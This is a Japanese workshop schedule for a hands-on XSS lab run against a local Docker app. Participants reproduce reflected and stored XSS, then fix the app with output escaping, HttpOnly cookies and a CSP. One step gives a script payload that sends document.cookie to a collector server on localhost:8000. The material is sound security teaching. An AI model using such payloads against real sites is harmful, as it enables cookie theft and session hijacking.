# THM ワークショップ進行表 — XSS 攻撃と防御

対象: Lumos / THM 参加者　所要: 約90分　前提: Docker が動く環境

攻撃 → 原因理解 → 自分でコード修正 → 再攻撃で無効化を確認、までを一周します。

## 事前準備（各自）

```bash
git clone https://github.com/Tivo0921/lumos-security-lab.git
cd lumos-security-lab
docker compose up --build        # victim: http://localhost:8080
```

> ⚠️ 必ず**シークレット/新規プロファイルのブラウザ**で開くこと。
> 通常ブラウザで他の localhost サービス（例: Supabase）にログインしていると、
> 同一ホスト名のため実在の認証 cookie まで漏れる（←これ自体も良い教材）。

## タイムテーブル

| 時間 | パート | 内容 |
|------|--------|------|
| 15分 | ① 攻撃体験 | Reflected / Stored XSS を各自再現（alert → cookie 窃取） |
| 10分 | ② 原因解説 | `${c}` で生入力が「データ→コード」に昇格する流れ |
| 30分 | ③ 修正タスク | `victim/server.js` の TODO を各自で実装 |
| 15分 | ④ 検証 | 同じ payload を投げ、無効化されたことを確認 |
| 20分 | ⑤ 発展 | HttpOnly / CSP を足して効果を観察 |

## ① 攻撃体験（payload）

- Reflected: `/search` に `<script>alert(1)</script>`
- Stored: `/guestbook` に `<script>alert(document.cookie)</script>`
- 窃取: attacker で `python3 catcher.py` → guestbook に
  `<script>new Image().src='http://localhost:8000/?c='+encodeURIComponent(document.cookie)</script>`

## ③ 修正タスク（`victim/server.js` の TODO）

- **TODO ①**: `/search` の `q` を出力時エスケープ
- **TODO ②**: `/guestbook` の各コメント `c` を出力時エスケープ（`esc()` を有効化して使う）
- 修正後は `docker compose restart victim` で反映

ヒント: 困ったら `solution` ブランチに模範解答があります。
```bash
git switch solution      # 答え合わせ
git switch main          # 自分の作業に戻る
```

## ④ 検証（期待結果）

同じ payload を入れても **popup が出ず**、画面に `<script>...` が**文字として表示**される。
catcher にも届かない。→ エスケープで「コードが データに降格」した証拠。

## ⑤ 発展

- cookie に `HttpOnly` を付け、`document.cookie` から消えることを確認（窃取不可に）
- `Content-Security-Policy` ヘッダでインライン script を禁止し、多層防御を体感

## 片付け

```bash
docker compose down
```
